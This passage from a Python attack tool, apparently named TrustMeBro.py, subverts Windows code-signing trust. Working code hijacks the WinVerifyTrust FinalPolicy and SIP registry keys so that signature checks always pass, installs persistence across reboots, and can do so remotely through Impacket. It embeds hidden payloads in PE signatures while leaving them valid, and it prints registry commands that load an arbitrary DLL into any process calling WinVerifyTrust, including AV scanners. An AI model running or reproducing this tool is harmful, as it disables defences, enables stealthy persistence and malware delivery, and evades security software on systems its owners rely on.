                domain, user = "", args.user
            args._target_str = f"{domain}/{user}:{args.password}@{args.target_ip}"

            reg_tool = args.tool or find_reg_tool()
            if not reg_tool:
                print("[-] Could not find 'reg.py' or 'impacket-reg' in PATH.")
                print("    Install Impacket or specify --tool path.")
                sys.exit(1)
            args._reg_tool = reg_tool
            print(f"[*] Remote mode: {args.target_ip} via {reg_tool}")

        print(f"[*] Action: {args.action.upper()}")

        if args.action == "finalpolicy":
            for val_name, val_data in FINALPOLICY_HIJACK.items():
                write_reg(args, FINALPOLICY_KEY, val_name, val_data, dry_run)
            if not dry_run:
                print("[+] FinalPolicy hijacked. All signature checks return success.")
                print("[!] System-wide. Affects all processes. Survives reboot.")
                print("Undo: TrustMeBro.py hijack ... --action finalpolicy-clean")
        elif args.action == "finalpolicy-clean":
            for val_name, val_data in FINALPOLICY_CLEAN.items():
                write_reg(args, FINALPOLICY_KEY, val_name, val_data, dry_run)
            if not dry_run:
                print("[+] FinalPolicy restored to SoftpubAuthenticode.")
        elif args.action == "custom-provider":
            import uuid as _uuid
            provider_guid = normalize_provider_guid(args.provider_guid) if args.provider_guid else "{" + str(_uuid.uuid4()).upper() + "}"
            provider_key = f"{FINALPOLICY_BASE_KEY}\\{provider_guid}"
            for val_name, val_data in FINALPOLICY_HIJACK.items():
                write_reg(args, provider_key, val_name, val_data, dry_run)
            if not dry_run:
                print(f"[+] Custom trust provider registered: {provider_guid}")
                print(f"Undo: TrustMeBro.py hijack ... --action custom-provider-clean --provider-guid {provider_guid}")
        elif args.action == "custom-provider-clean":
            if not args.provider_guid:
                print("[-] --provider-guid is required for custom-provider-clean.")
                sys.exit(1)
            provider_guid = normalize_provider_guid(args.provider_guid)
            provider_key = f"{FINALPOLICY_BASE_KEY}\\{provider_guid}"
            for val_name, val_data in FINALPOLICY_CLEAN.items():
                write_reg(args, provider_key, val_name, val_data, dry_run)
            if not dry_run:
                print(f"[+] Custom trust provider cleaned: {provider_guid}")
        else:
            # hijack or clean: SIP registry
            config = HIJACK_CONFIG if args.action == "hijack" else CLEAN_CONFIG
            # Resolve SIP set
            sip_types_arg = getattr(args, 'sip_types', None)
            if getattr(args, 'all_sips', False):
                active_sips = dict(ALL_SIPS)
            elif sip_types_arg:
                if sip_types_arg.lower() == 'all':
                    active_sips = dict(SIPS)
                else:
                    active_sips = {}
                    for t in [x.strip() for x in sip_types_arg.split(',')]:
                        match = next((k for k in ALL_SIPS if k.lower() == t.lower()), None)
                        if match:
                            active_sips[match] = ALL_SIPS[match]
                        else:
                            print(f"[-] Unknown SIP type: {t}. Available: {','.join(sorted(ALL_SIPS.keys()))}")
                            sys.exit(1)
            else:
                active_sips = {k: SIPS[k] for k in DEFAULT_SIP_TYPES}
            if getattr(args, 'sac', False) and 'SmartAppControl' not in active_sips:
                active_sips.update(SAC_SIP)
            print(f"[*] Targeting {len(active_sips)} SIP(s): {', '.join(active_sips.keys())}")
            if getattr(args, 'wow64_only', False):
                print("[!] WOW64-only: 32-bit callers affected, 64-bit registry untouched.")

            for name, guid in active_sips.items():
                if not getattr(args, 'wow64_only', False):
                    key64 = f"HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}"
                    for val_name, val_data in config.items():
                        write_reg(args, key64, val_name, val_data, dry_run)
                key32 = f"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{guid}"
                for val_name, val_data in config.items():
                    write_reg(args, key32, val_name, val_data, dry_run)

            if not dry_run:
                if args.action == "hijack":
                    print(f"[+] SIP persistence installed for {len(active_sips)} type(s).")
                    print("Undo: TrustMeBro.py hijack ... --action clean")
                else:
                    print(f"[+] SIP keys restored for {len(active_sips)} type(s).")

    elif args.command == "embed":
        _require_asn1crypto()
        with open(args.source, 'rb') as f:
            pe_data = f.read()
        with open(args.payload, 'rb') as f:
            payload = f.read()
        try:
            cert_dir_offset, cert_rva, cert_size, entries, idx = read_pe_pkcs7(pe_data, args.signer_index)
        except ValueError as e:
            print(f"[-] {e}")
            sys.exit(1)
        pkcs7 = entries[idx][2]
        ci = cms.ContentInfo.load(pkcs7)
        sd = ci['content']
        if args.camouflage:
            sd = pkcs7_embed_camouflage(sd, payload)
            used_oid = SPC_NESTED_SIGNATURE_OID
            mode_label = "camouflage (SPC_NESTED_SIGNATURE)"
        else:
            sd = pkcs7_embed_payload(sd, payload, args.oid)
            used_oid = args.oid
            mode_label = "direct"
        new_ci = cms.ContentInfo({'content_type': 'signed_data', 'content': sd})
        output = rebuild_pe_cert(pe_data, cert_dir_offset, cert_rva, entries, idx, new_ci.dump())
        with open(args.output, 'wb') as f:
            f.write(output)
        print(f"[+] Embedded {len(payload):,} bytes [{mode_label}] (OID: {used_oid}) into {args.output}")
        print(f"[*] Delta: +{len(output) - len(pe_data):,} bytes. Signature remains valid.")

    elif args.command == "extract":
        _require_asn1crypto()
        with open(args.source, 'rb') as f:
            pe_data = f.read()
        try:
            _, _, _, entries, idx = read_pe_pkcs7(pe_data, args.signer_index)
        except ValueError as e:
            print(f"[-] {e}")
            sys.exit(1)
        pkcs7 = entries[idx][2]
        ci = cms.ContentInfo.load(pkcs7)
        if args.camouflage:
            payload = pkcs7_extract_camouflage(ci['content'])
            label = f"camouflage OID {SPC_NESTED_SIGNATURE_OID}"
        else:
            payload = pkcs7_extract_payload(ci['content'], args.oid)
            label = f"OID {args.oid}"
        if payload is None:
            print(f"[-] No payload found with {label}")
            sys.exit(1)
        with open(args.output, 'wb') as f:
            f.write(payload)
        print(f"[+] Extracted {len(payload):,} bytes from {label} to {args.output}")

    elif args.command == "sip-exec":
        import uuid as _uuid
        guid = args.guid or "{" + str(_uuid.uuid4()).upper() + "}"
        if not guid.startswith("{"):
            guid = "{" + guid + "}"

        base = "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2"
        key = f"{base}\\{guid}"

        if args.clean:
            print(f"[*] Removing SIP exec registration: {guid}")
            print(f"[*] Registry key: {key}")
            print("[!] Manual removal required (use reg.exe delete or regedit).")
            print(f'    reg delete "{key}" /f')
        else:
            print(f"[+] SIP Exec Registration")
            print(f"    GUID:     {guid}")
            print(f"    DLL:      {args.dll}")
            print(f"    Function: {args.funcname}")
            print(f"    Key:      {key}")
            print()
            print("[*] Registry commands to run on target (requires admin):")
            print(f'    reg add "{key}" /v Dll /t REG_SZ /d "{args.dll}" /f')
            print(f'    reg add "{key}" /v FuncName /t REG_SZ /d "{args.funcname}" /f')
            print()
            print("[!] Once registered, your DLL loads in ANY process that calls WinVerifyTrust.")
            print("[!] This includes Explorer, SmartScreen, AV scanners, and certutil.")
            print("[!] The DLL function is called during SIP file-type resolution for every file.")
            print(f"[*] To remove: reg delete \"{key}\" /f")

    else:
        parser.print_help()

if __name__ == "__main__":
    main()
